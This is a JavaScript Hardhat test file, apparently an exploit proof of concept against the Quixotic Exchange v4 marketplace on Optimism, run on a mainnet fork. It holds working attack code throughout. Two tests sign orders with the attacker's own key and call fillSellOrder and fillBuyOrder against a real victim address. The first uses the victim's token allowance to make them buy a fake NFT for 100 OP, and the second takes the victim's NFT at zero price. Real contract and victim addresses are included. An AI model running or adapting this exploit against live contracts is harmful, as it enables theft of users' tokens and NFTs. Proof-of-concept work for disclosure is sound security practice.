const { ethers } = require("hardhat");
const EthCrypto = require('eth-crypto');
describe("Quixotic", function(){

    before (async function(){
      ExchangeInterface = [ 
        "function fillSellOrder(address payable seller, address contractAddress, uint256 tokenId, uint256 startTime, uint256 expiration, uint256 price, uint256 quantity, uint256 createdAtBlockNumber, address paymentERC20, bytes memory signature, address payable buyer) external payable",
        "function fillBuyOrder(address payable buyer, address contractAddress, uint256 tokenId, uint256 startTime, uint256 expiration, uint256 price, uint256 quantity, address paymentERC20, bytes memory signature, address payable seller) external payable"
      ]

      // Quixotic Exchangev4 address
      ExchangeAdd = "0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6";
      
      OPInterface = [
        "function balanceOf(address account) external view returns (uint256)",
        "function allowance(address owner, address spender) external view returns (uint256)",
        "function approve(address spender, uint256 amount) external returns (bool)"
      ]
      // Optimism Token
      OPAdd = "0x4200000000000000000000000000000000000042";

      // Use your Optimism node API key for the jsonRPCUrl
      await network.provider.request({
          method: "hardhat_reset",
          params: [{forking: {jsonRpcUrl: process.env.ALCHEMY_OPTIMISM, blockNumber: 13588105,},},],
        });       
      
      [attacker] = await ethers.getSigners();

      // The victim we are targeting to sell our Fake NFT
      victimAdd = "0x42332d7005Bf5f0bE4DBc324E40a9ea09684c964";
      victim = await ethers.getSigner(victimAdd);

      OP = await ethers.getContractAt(OPInterface, OPAdd, attacker);
      Exchange = await ethers.getContractAt(ExchangeInterface, ExchangeAdd, attacker);

      //Fake ERC721 NFT Contract
      cont = await ethers.getContractFactory("FakeNFT");
      FakeNFT = await cont.deploy();

      /*Mint IDs to our own address
      * 1 for 1st case
        2 for 2nd case  */
      await FakeNFT.MintNFT(attacker.address, 1);
      await FakeNFT.MintNFT(victimAdd, 2);

      // Approve the Exchange so that it can transfer our NFT to buyer
      await FakeNFT.setApprovalForAll(ExchangeAdd, true);

      // Ahhh... Victim doesn't have any native funds. No worries, we can transfer some. Anything for the PoC XD
      await attacker.sendTransaction({to: victimAdd, value: ethers.utils.parseEther("100")});

      await network.provider.request({
        method: "hardhat_impersonateAccount",
        params: [victimAdd],
      }); 

      // Let's assume victim has approved the Exchange so that it can transfer the NFT tp concerned buyer 
      await FakeNFT.connect(victim).setApprovalForAll(ExchangeAdd, true);

      // Let's assume victim has already approved its tokens to Exchange, so as to allow the Exchange to transfer tokens on its behalf
      await OP.connect(victim).approve(ExchangeAdd, await OP.balanceOf(victimAdd));

    });

    it ("Exploit PoC : Selling Fake NFT to Victim without consent", async function(){
      currentBlockNumber = await ethers.provider.getBlockNumber();
      currentBlock = await ethers.provider.getBlock();
      // The price we want to sell our NFT at
      price = ethers.utils.parseEther("100.0");
      
      // Added a function in NFT contract itself to get the message hash easily.
      hash = await FakeNFT.generateSellerDigest(attacker.address, FakeNFT.address, 1, 0, currentBlock.timestamp+200, price, 1, currentBlockNumber, OP.address);
      
      //use your private key to sign the message
      signature = EthCrypto.sign(process.env.Attacker_PRIVKEY, hash);
      
      console.log("NFT Owner before the attack: ", await FakeNFT.ownerOf(1),
      "\nAttacker's Balance before the attack: ", await OP.balanceOf(attacker.address),
      "\nVictim's Balance before the attack: ", await OP.balanceOf(victim.address));
      
      await Exchange.fillSellOrder(
      attacker.address,
      FakeNFT.address, 
      1, // token Id
      0, // start time should be prior to current time, so we can pass anything less than current time
      currentBlock.timestamp+200, // expiry time, should be in future, so again it can by any time
      price, 
      1, //quantity as it's an NFT so gonna be 1
      currentBlockNumber, // created at which block number? It is used to verify that it's a new order considering the cancelled orders in the past(if it was cancelled at an older block)
      OP.address, //the payment token. The token we want to trade for our NFT from the buyer. It should be a registered token in the PaymentERC20Registry(0x445e27A25606DAD4321c7b97eF8350A9585a5c78), and the victim should be having enough balance and has provide enough allowance to exchange(at least more than the price we are targetting)
      signature, // attacker/seller's signature
      victimAdd); // buyer/victim
      
      console.log("\nNFT Owner after the attack: ", await FakeNFT.ownerOf(1),
      "\nAttacker's Balance after the attack: ", await OP.balanceOf(attacker.address),
      "\nVictim's Balance after the attack: ", await OP.balanceOf(victim.address));

      // We will receive 97.5% of the target price as 2.5% goes to _makerWallet(0xeC1557A67d4980C948cD473075293204F4D280fd)
      
    });

    it ("Exploit PoC : Stealing Genuine NFT from Victim without consent", async function(){
      currentBlockNumber = await ethers.provider.getBlockNumber();
      currentBlock = await ethers.provider.getBlock();
      // The price we want to buy the NFT at. Obviously 0 XD
      price = 0;
      
      // Added a function in NFT contract itself to get the message hash easily.
      hash = await FakeNFT.generateBuyerDigest(attacker.address, FakeNFT.address, 2, 0, currentBlock.timestamp+200, price, 1, OP.address);
      
      //use your private key to sign the message
      signature = EthCrypto.sign(process.env.Attacker_PRIVKEY, hash);
      
      console.log("\nNFT Owner before the attack: ", await FakeNFT.ownerOf(2),
      "\nAttacker's Balance before the attack: ", await OP.balanceOf(attacker.address),
      "\nVictim's Balance before the attack: ", await OP.balanceOf(victim.address));
      
      await Exchange.fillBuyOrder(
      attacker.address,
      FakeNFT.address, 
      2, // token Id
      0, // start time should be prior to current time, so we can pass anything less than current time
      currentBlock.timestamp+200, // expiry time, should be in future, so again it can by any time
      price, 
      1, //quantity as it's an NFT so gonna be 1
      OP.address, //the payment token. The token we want to trade for the NFT to the seller. It should be a registered token in the PaymentERC20Registry(0x445e27A25606DAD4321c7b97eF8350A9585a5c78), and the buyer should be having enough balance and has provide enough allowance to exchange(at least more than the price we are targetting)
      signature, // attacker/buyer's signature
      victimAdd); // seller/victim
      
      console.log("\nNFT Owner after the attack: ", await FakeNFT.ownerOf(2),
      "\nAttacker's Balance after the attack: ", await OP.balanceOf(attacker.address),
      "\nVictim's Balance after the attack: ", await OP.balanceOf(victim.address));
      
      // The balances won't change as we are buying NFT for zero price
    });




});